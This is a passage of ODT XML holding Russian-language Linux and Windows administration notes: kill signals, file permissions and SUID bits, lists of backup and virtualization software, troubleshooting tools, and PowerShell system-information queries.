использовать параметр -</text:span><text:span text:style-name="T2">l</text:span><text:span text:style-name="T3"> рассматриваемой утилиты:</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">$ kill -l</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P14" loext:marker-style-name="T1"><text:span text:style-name="T2">1) SIGHUP 2) SIGINT 3) SIGQUIT 4) SIGILL 5) SIGTRAP</text:span></text:p>
      <text:p text:style-name="P14" loext:marker-style-name="T1"><text:span text:style-name="T2">6) SIGABRT 7) SIGBUS 8 ) SIGFPE 9) SIGKILL 10) SIGUSR1</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">11) SIGSEGV 12) SIGUSR2 13) SIGPIPE 14) SIGALRM 15) SIGTERM</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">16) SIGSTKFLT 17) SIGCHLD 18) SIGCONT 19) SIGSTOP 20) SIGTSTP</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">21) SIGTTIN 22) SIGTTOU 23) SIGURG 24) SIGXCPU 25) SIGXFSZ</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">26) SIGVTALRM 27) SIGPROF 28) SIGWINCH 29) SIGIO 30) SIGPWR</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">31) SIGSYS 34) SIGRTMIN 35) SIGRTMIN+1 36) SIGRTMIN+2 37) SIGRTMIN+3</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">38) SIGRTMIN+4 39) SIGRTMIN+5 40) SIGRTMIN+6 41) SIGRTMIN+7 42) SIGRTMIN+8</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">43) SIGRTMIN+9 44) SIGRTMIN+10 45) SIGRTMIN+11 46) SIGRTMIN+12 47) SIGRTMIN+13</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">48) SIGRTMIN+14 49) SIGRTMIN+15 50) SIGRTMAX-14 51) SIGRTMAX-13 52) SIGRTMAX-12</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">53) SIGRTMAX-11 54) SIGRTMAX-10 55) SIGRTMAX-9 56) SIGRTMAX-8 57) SIGRTMAX-7</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:soft-page-break/><text:span text:style-name="T2">58) SIGRTMAX-6 59) SIGRTMAX-5 60) SIGRTMAX-4 61) SIGRTMAX-3 62) SIGRTMAX-2</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">63) </text:span><text:span text:style-name="T2">SIGRTMAX</text:span><text:span text:style-name="T3">-1 64) </text:span><text:span text:style-name="T2">SIGRTMAX</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">Завершение работы процесса. Для завершения работы процесса достаточно передать его идентификатор команде </text:span><text:span text:style-name="T2">kill</text:span><text:span text:style-name="T3">. В данном случае в качестве рассматриваемого процесса будет использоваться предварительно запущенный процесс </text:span><text:span text:style-name="T2">ping</text:span><text:span text:style-name="T3"> (в первой вкладке эмулятора терминала):</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">$ ping 127.0.0.1</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.058 ms</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1">…</text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">Для получения его идентификатора достаточно использовать команду </text:span><text:span text:style-name="T2">ps</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">aux</text:span><text:span text:style-name="T3">, а также фильтр </text:span><text:span text:style-name="T2">grep</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">ping</text:span><text:span text:style-name="T3"> (во второй вкладке эмулятора терминала):</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">$ ps aux | grep ping</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">…</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">alex 14371 0.0 0.0 18888 1024 pts/0 S+ 21:08 0:00 ping 127.0.0.1</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">alex</text:span><text:span text:style-name="T3"> 14381 0.0 0.0 17628 908 </text:span><text:span text:style-name="T2">pts</text:span><text:span text:style-name="T3">/1 </text:span><text:span text:style-name="T2">S</text:span><text:span text:style-name="T3">+ 21:08 0:00 </text:span><text:span text:style-name="T2">grep</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">ping</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">Процесс имеет идентификатор 14371. Для его завершения достаточно использовать команду </text:span><text:span text:style-name="T2">kill</text:span><text:span text:style-name="T3"> (также во второй вкладке эмулятора терминала):</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">$ </text:span><text:span text:style-name="T2">kill</text:span><text:span text:style-name="T3"> 14371</text:span></text:p>
      <text:p text:style-name="P1">В результате исполнение процесса будет остановлено (в первой вкладке эмулятора терминала):</text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">$ ping 127.0.0.1</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.058 ms</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">…</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">64 bytes from 127.0.0.1: icmp_seq=37 ttl=64 time=0.052 ms</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1">Завершено</text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T3">Завершение работы зависшего процесса. В случае зависшего процесса или процесса, игнорирующего сигнал </text:span><text:span text:style-name="T2">SIGTERM</text:span><text:span text:style-name="T3">, следует использовать сигнал </text:span><text:span text:style-name="T2">SIGKILL</text:span><text:span text:style-name="T3">.</text:span></text:p>
      <text:p text:style-name="P13">Для этого следует преобразовать недавно рассмотренную команду:</text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">$ </text:span><text:span text:style-name="T2">kill</text:span><text:span text:style-name="T3"> 14371</text:span></text:p>
      <text:p text:style-name="P1">В команду:</text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">$ </text:span><text:span text:style-name="T2">kill</text:span><text:span text:style-name="T3"> -</text:span><text:span text:style-name="T2">s</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">SIGKILL</text:span><text:span text:style-name="T3"> 14371</text:span></text:p>
      <text:p text:style-name="P7">Исполнение процесса должно завершиться в любом случае.</text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">Работа с правами доступа файлов и директорий в </text:span><text:span text:style-name="T2">Linux</text:span><text:span text:style-name="T3">:</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3"># </text:span><text:span text:style-name="T2">chown</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">vasya</text:span><text:span text:style-name="T3"> /</text:span><text:span text:style-name="T2">file</text:span><text:span text:style-name="T3"> - Назначить пользователя </text:span><text:span text:style-name="T2">vasya</text:span><text:span text:style-name="T3"> владельцем файла </text:span><text:span text:style-name="T2">file</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3"># </text:span><text:span text:style-name="T2">chown</text:span><text:span text:style-name="T3"> -</text:span><text:span text:style-name="T2">R</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">vasya</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">directory</text:span><text:span text:style-name="T3"> - Рекурсивно обойти директорию </text:span><text:span text:style-name="T2">directory</text:span><text:span text:style-name="T3"> и назначить пользователя </text:span><text:span text:style-name="T2">vasya</text:span><text:span text:style-name="T3"> владельцем всех вложенных файлов и директорий</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3"># </text:span><text:span text:style-name="T2">chown</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">vasya</text:span><text:span text:style-name="T3">:</text:span><text:span text:style-name="T2">group</text:span><text:span text:style-name="T3"> /</text:span><text:span text:style-name="T2">file</text:span><text:span text:style-name="T3"> - Назначить владельца и группу для файла /</text:span><text:span text:style-name="T2">file</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3"># </text:span><text:span text:style-name="T2">chmod</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">ugo</text:span><text:span text:style-name="T3">+</text:span><text:span text:style-name="T2">rwx</text:span><text:span text:style-name="T3"> /</text:span><text:span text:style-name="T2">directory</text:span><text:span text:style-name="T3"> - Установить полные права доступа </text:span><text:span text:style-name="T2">rwx</text:span><text:span text:style-name="T3"> ( </text:span><text:span text:style-name="T2">Read</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">Write</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">eXecute</text:span><text:span text:style-name="T3"> ) для всех </text:span><text:span text:style-name="T2">ugo</text:span><text:span text:style-name="T3"> ( </text:span><text:span text:style-name="T2">User</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">Group</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">Other</text:span><text:span text:style-name="T3"> ) на директорию /</text:span><text:span text:style-name="T2">directory</text:span><text:span text:style-name="T3">. То-же самое можно сделать, используя числовой представление </text:span><text:span text:style-name="T2">chmod</text:span><text:span text:style-name="T3"> 777 </text:span><text:span text:style-name="T2">directory</text:span></text:p>
      <text:p text:style-name="P2"><text:soft-page-break/><text:span text:style-name="T3"># </text:span><text:span text:style-name="T2">chmod</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">go</text:span><text:span text:style-name="T3">-</text:span><text:span text:style-name="T2">rwx</text:span><text:span text:style-name="T3"> /</text:span><text:span text:style-name="T2">directory</text:span><text:span text:style-name="T3"> - Удалить все права на директорию /</text:span><text:span text:style-name="T2">directory</text:span><text:span text:style-name="T3"> для группы и остальных</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3"># </text:span><text:span text:style-name="T2">chgrp</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">new</text:span><text:span text:style-name="T3">_</text:span><text:span text:style-name="T2">group</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">file</text:span><text:span text:style-name="T3"> - Изменить группу-владельца для </text:span><text:span text:style-name="T2">file</text:span><text:span text:style-name="T3"> на </text:span><text:span text:style-name="T2">new</text:span><text:span text:style-name="T3">_</text:span><text:span text:style-name="T2">group</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становить так называемый </text:span><text:span text:style-name="T2">STIKY</text:span><text:span text:style-name="T3">-бит на директорию /</text:span><text:span text:style-name="T2">home</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">public</text:span><text:span text:style-name="T3">. Удалить файл в такой директории может только владелец данного файла</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далить </text:span><text:span text:style-name="T2">STIKY</text:span><text:span text:style-name="T3">-бит с директории /</text:span><text:span text:style-name="T2">home</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">public</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"># chmod u+s /bin/binary_file - Установить SUID-бит на файл /bin/binary_file. </text:span><text:span text:style-name="T3">Это позволяет любому пользователю системы, запускать данный файл с правами владельца файла</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"># chmod u-s /bin/binary_file - Удалить SUID-бит с файла /bin/binary_file</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"># chmod g+s /home/public - Установить SGID-бит на директории /home/public</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"># chmod g-s /home/public - Удалить SGID-бит с директории /home/public</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3"># </text:span><text:span text:style-name="T2">find</text:span><text:span text:style-name="T3"> / -</text:span><text:span text:style-name="T2">perm</text:span><text:span text:style-name="T3"> -</text:span><text:span text:style-name="T2">u</text:span><text:span text:style-name="T3">+</text:span><text:span text:style-name="T2">s</text:span><text:span text:style-name="T3"> - Поиск всех файлов с установленным </text:span><text:span text:style-name="T2">SUID</text:span><text:span text:style-name="T3"> битом, начиная с корня файловой системы</text:span></text:p>
      <text:p text:style-name="P11"><text:span text:style-name="T3"># </text:span><text:span text:style-name="T2">ls</text:span><text:span text:style-name="T3"> -</text:span><text:span text:style-name="T2">lh</text:span><text:span text:style-name="T3"> - Листинг текущего каталога с правами доступа</text:span></text:p>
      <text:p text:style-name="P1">Отличное введение в концепции криптографии для начинающих:</text:p>
      <text:p text:style-name="P1">Часть 1: https://sergioprado.blog/introduction-to-encryption-for-embedded-linux-developers/</text:p>
      <text:p text:style-name="P1">Часть 2: https://sergioprado.blog/a-hands-on-approach-to-symmetric-key-encryption/</text:p>
      <text:p text:style-name="P7">Часть 3: https://sergioprado.blog/asymmetric-key-encryption-and-digital-signatures-in-practice/</text:p>
      <text:p text:style-name="P1">Как в Excel найти одинаковые значения?</text:p>
      <text:p text:style-name="P1">В Excel таблицах, особенно больших, дубликаты данных - довольно частое явление. Иногда они нужны и их можно не трогать, иногда их следует удалить, чтобы они не влияли на статистику, а иногда их просто нужно выделить.</text:p>
      <text:p text:style-name="P1">Чтобы быстро найти повторяющиеся значения:</text:p>
      <text:p text:style-name="P1">1. Выделите диапазон, в котором нужно найти повторяющиеся значения.</text:p>
      <text:p text:style-name="P13">2. На вкладке «Главная» выберите «Условное форматирование» → «Правило выделения ячеек» → «Повторяющиеся значения» → «ОК».</text:p>
      <text:p text:style-name="P13">3. В разделе «Сортировка и фильтр» выберите «Фильтр» и установите фильтр по цвету выделения.</text:p>
      <text:p text:style-name="P7">После всех манипуляций в списке останутся только одинаковые выделенные значения. Если вам затем нужно увидеть уникальные ячейки из этого списка, используйте функцию UNIQUE.</text:p>
      <text:p text:style-name="P1">Подборка софта с открытым исходным кодом для резервного копирования:</text:p>
      <text:p text:style-name="P1">Amanda (http://www.amanda.org/) - Инструмент резервного копирования по модели клиент-сервер.</text:p>
      <text:p text:style-name="P2"><text:soft-page-break/><text:span text:style-name="T3">Backupninja (https://0xacab.org/liberate/backupninja)- Легкая, расширяемая мета-система резервного копирования.</text:span></text:p>
      <text:p text:style-name="P1">BackupPC (https://backuppc.github.io/backuppc/) - высокопроизводительная система для резервного копирования на диск.</text:p>
      <text:p text:style-name="P1">Bareos (http://www.bareos.org/en/) - Форк инструмента резервного копирования Bacula.</text:p>
      <text:p text:style-name="P1">Barman (http://www.pgbarman.org/) - Менеджер резервного копирования и восстановления для аварийного восстановления серверов PostgreSQL.</text:p>
      <text:p text:style-name="P1">BorgBackup (https://github.com/borgbackup/borg) - форк дедуплицирующей программы резервного копирования Attic, написанной на Python.</text:p>
      <text:p text:style-name="P1">Burp (http://burp.grke.org/) - Программа резервного копирования и восстановления данных по сети.</text:p>
      <text:p text:style-name="P1">DREBS (https://github.com/dojo4/drebs) - Скрипт резервного копирования AWS EBS, поддерживающий стратегии.</text:p>
      <text:p text:style-name="P1">Dar (http://dar.linux.free.fr/)- Что означает Disk ARchive, это надежная и многофункциональная программа архивирования и резервного копирования в стиле tar. (Исходный код) GPL-2.0 C++</text:p>
      <text:p text:style-name="P1">Duplicati (http://www.duplicati.com/)- Многочисленные бэкэнды, шифрование, web-ui и инструмент резервного копирования для нескольких ОС.</text:p>
      <text:p text:style-name="P1">Duplicity (https://duplicity.gitlab.io/) - Шифрованное резервное копирование с эффективной пропускной способностью, использующее алгоритм rsync.</text:p>
      <text:p text:style-name="P1">Elkarbackup (https://github.com/elkarbackup/elkarbackup) - Решение для резервного копирования на основе RSnapshot с простым веб-интерфейсом.</text:p>
      <text:p text:style-name="P1">rclone (https://rclone.org/)- программа командной строки для синхронизации файлов и каталогов с несколькими облачными системами хранения/провайдерами.</text:p>
      <text:p text:style-name="P1">Rdiff-backup (http://www.nongnu.org/rdiff-backup/) - простое удаленное инкрементное резервное копирование всех ваших файлов.</text:p>
      <text:p text:style-name="P1">Restic (https://restic.net/) - Безопасный инструмент удаленного резервного копирования. Разработан для простого, быстрого, надежного и эффективного резервного копирования.</text:p>
      <text:p text:style-name="P1">Rsnapshot (http://rsnapshot.org/)- Утилита для создания моментальных снимков файловой системы.</text:p>
      <text:p text:style-name="P1">Shield (https://github.com/starkandwayne/shield)- подключаемая архитектура для резервного копирования и восстановления систем баз данных.</text:p>
      <text:p text:style-name="P13">Snebu (http://www.snebu.com/)- Резервное копирование моментальных снимков с глобальной мультиклиентской дедупликацией и прозрачным сжатием.</text:p>
      <text:p text:style-name="P13">UrBackup (http://www.urbackup.org/) - Еще одна клиент-серверная система резервного копирования.</text:p>
      <text:p text:style-name="P7">ZBackup (http://zbackup.org/) - Универсальный инструмент резервного копирования с дедупликацией.</text:p>
      <text:p text:style-name="P1">Подборка программного обеспечения для виртуализации:</text:p>
      <text:p text:style-name="P2"><text:soft-page-break/><text:span text:style-name="T3">ConVirt <text:s/>(http://www.convirture.com/products_opensource.php)- Предоставляет основные функции для централизованного управления виртуализированной средой KVM или Xen.</text:span></text:p>
      <text:p text:style-name="P1">Ganeti (http://www.ganeti.org/) - Программное средство управления кластерными виртуальными серверами, построенное на базе KVM и Xen.</text:p>
      <text:p text:style-name="P1">KVM (http://www.linux-kvm.org/) - инфраструктура виртуализации ядра Linux.</text:p>
      <text:p text:style-name="P1">OpenNebula (http://opennebula.org/) - Гибкое корпоративное облако, сделанное простым.</text:p>
      <text:p text:style-name="P1">OpenNode (http://opennodecloud.com/) - Создает программное обеспечение для управления инфраструктурой с открытым исходным кодом и реализует облачные системы.</text:p>
      <text:p text:style-name="P1">oVirt (http://www.ovirt.org/)- Управление виртуальными машинами, хранилищами и виртуальными сетями.</text:p>
      <text:p text:style-name="P1">Packer (https://www.packer.io/) - Инструмент для создания идентичных образов машин для нескольких платформ из одной исходной конфигурации.</text:p>
      <text:p text:style-name="P1">Proxmox VE (https://www.proxmox.com/proxmox-ve) - Решение для управления виртуализацией.</text:p>
      <text:p text:style-name="P1">QEMU (http://www.qemu.org/) - универсальный эмулятор и виртуализатор машин.</text:p>
      <text:p text:style-name="P1">Vagrant (https://www.vagrantup.com/) - Инструмент для создания полноценных сред разработки.</text:p>
      <text:p text:style-name="P1">VirtualBox (https://www.virtualbox.org/) - Продукт виртуализации от корпорации Oracle.</text:p>
      <text:p text:style-name="P1">XCP-ng (http://www.xcp-ng.org/) - Основанная на Citrix XenServer, XCP-ng является полностью открытой платформой виртуализации.</text:p>
      <text:p text:style-name="P7">Xen (http://www.xenproject.org/)- Монитор виртуальных машин для 32/64 битных архитектур Intel / AMD (IA 64) и PowerPC 970.</text:p>
      <text:p text:style-name="P1">Как запустить команду с ограничением по времени в Linux. Наша цель - запустить команду с именем « ping www.cyberciti.biz» с ограничением по времени в 30 секунд:</text:p>
      <text:p text:style-name="P1">Откройте приложение терминала</text:p>
      <text:p text:style-name="P1">Запустите команду ping , чтобы она прервалась через 30 секунд:</text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">timeout 30s ping www.cyberciti.biz</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1">Можно комбинировать команды sleep и другие оболочки:</text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">ping www.cyberciti.biz &amp; sleep 30s; kill $!</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P7">Давайте посмотрим все команды тайм-аута, синтаксис и примеры в операционных системах Linux. https://www.cyberciti.biz/faq/linux-run-a-command-with-a-time-limit/</text:p>
      <text:p text:style-name="P20">Как диагностировать таинственный процесс, который занимает слишком много ресурсов ЦП, памяти, и т. д.? На приведенной ниже диаграмме показаны полезные инструменты в системе Linux. 'vmstat' - сообщает информацию о процессах, памяти, подкачке, активности ЦП. 'iostat' - сообщает статистику процессора и ввода/вывода системы. 'netstat' - отображает статистические данные, относящиеся к протоколам IP, TCP, UDP и ICMP. 'lsof' - список открытых файлов текущей системы. «pidstat» - отслеживает использование системных ресурсов всеми или указанными процессами, включая ЦП, память, переключение задач, потоки и т. д.</text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">Top 5+ SQL Interview Problem:</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">1. Database and SQL - https://bit.ly/3zGK6S7</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">2. SQL Query - https://bit.ly/3bGzN8r</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">3. MySQL - https://bit.ly/3bFkhtE</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">4. SQL Server - https://bit.ly/3A5qIj0</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">5. PostgreSQL - https://bit.ly/3BOLLHP</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P11" loext:marker-style-name="T1"><text:span text:style-name="T2">6. Oracle - https://bit.ly/3zF2WsH</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1">Инструменты для поиска и устранения неисправностей:</text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">grml</text:span><text:span text:style-name="T3"> - загрузочный </text:span><text:span text:style-name="T2">Live</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">CD</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">Debian</text:span><text:span text:style-name="T3"> с мощными инструментами </text:span><text:span text:style-name="T2">CLI</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">https</text:span><text:span text:style-name="T3">://</text:span><text:span text:style-name="T2">grml</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">org</text:span><text:span text:style-name="T3">/</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">mitmproxy</text:span><text:span text:style-name="T3"> - инструмент </text:span><text:span text:style-name="T2">Python</text:span><text:span text:style-name="T3">, используемый для перехвата, просмотра и модификации сетевого трафика. Незаменим при устранении некоторых проблем </text:span><text:span text:style-name="T2">https</text:span><text:span text:style-name="T3">://</text:span><text:span text:style-name="T2">mitmproxy</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">org</text:span><text:span text:style-name="T3">/</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">mtr</text:span><text:span text:style-name="T3"> - сетевая утилита, объединяющая </text:span><text:span text:style-name="T2">traceroute</text:span><text:span text:style-name="T3"> и </text:span><text:span text:style-name="T2">ping</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">https</text:span><text:span text:style-name="T3">://</text:span><text:span text:style-name="T2">www</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">bitwizard</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">nl</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">mtr</text:span><text:span text:style-name="T3">/</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">perf</text:span><text:span text:style-name="T3">-</text:span><text:span text:style-name="T2">tools</text:span><text:span text:style-name="T3"> - инструменты анализа производительности, основанные на </text:span><text:span text:style-name="T2">Linux</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">perf</text:span><text:span text:style-name="T3">_</text:span><text:span text:style-name="T2">events</text:span><text:span text:style-name="T3"> (</text:span><text:span text:style-name="T2">aka</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">perf</text:span><text:span text:style-name="T3">) и </text:span><text:span text:style-name="T2">ftrace</text:span><text:span text:style-name="T3">. </text:span><text:span text:style-name="T2">https</text:span><text:span text:style-name="T3">://</text:span><text:span text:style-name="T2">github</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">com</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">brendangregg</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">perf</text:span><text:span text:style-name="T3">-</text:span><text:span text:style-name="T2">tools</text:span></text:p>
      <text:p text:style-name="P11" loext:marker-style-name="T1"><text:span text:style-name="T2">wireshark</text:span><text:span text:style-name="T3"> - лучший в мире анализатор сетевых протоколов </text:span><text:span text:style-name="T2">https</text:span><text:span text:style-name="T3">://</text:span><text:span text:style-name="T2">www</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">wireshark</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">org</text:span><text:span text:style-name="T3">/</text:span></text:p>
      <text:p text:style-name="P1">PowerShell скрипты для сбора информации о компьютерах: Собираем сведения о рабочих столах локального компьютера: Get-CimInstance -ClassName Win32_Desktop</text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">Вывод</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">сведений</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">о</text:span><text:span text:style-name="T2"> BIOS: Get-CimInstance -ClassName Win32_BIOS</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">Вывод</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">сведений</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">о</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">процессоре</text:span><text:span text:style-name="T2">:</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">Get-CimInstance -ClassName Win32_Processor | Select-Object -ExcludeProperty "CIM*"</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">Get-CimInstance -ClassName Win32_ComputerSystem | Select-Object -Property SystemType</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">SystemType</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">----------</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">X86-based PC</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">Получить</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">данные</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">поставщика</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">вычислительной</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">техники</text:span><text:span text:style-name="T2"> (OEM): Get-CimInstance -ClassName Win32_ComputerSystem</text:span></text:p>
      <text:p text:style-name="P2"><text:soft-page-break/><text:span text:style-name="T3">Список</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">установленных</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">исправлений</text:span><text:span text:style-name="T2">: Get-CimInstance -ClassName Win32_QuickFixEngineering</text:span></text:p>
      <text:p text:style-name="P1">Перечисление сведений о версии операционной системы:</text:p>
      <text:p text:style-name="P14" loext:marker-style-name="T1"><text:span text:style-name="T2">Get-CimInstance -ClassName Win32_OperatingSystem |</text:span></text:p>
      <text:p text:style-name="P14" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="2"/>Select-Object -Property BuildNumber,BuildType,OSType,ServicePackMajorVersion,ServicePackMinorVersion</text:span></text:p>
      <text:p text:style-name="P1">Общие сведения о локальных пользователях:</text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">Get-CimInstance -ClassName Win32_OperatingSystem |</text:span><text:span text:style-name="T2"/></text:p>
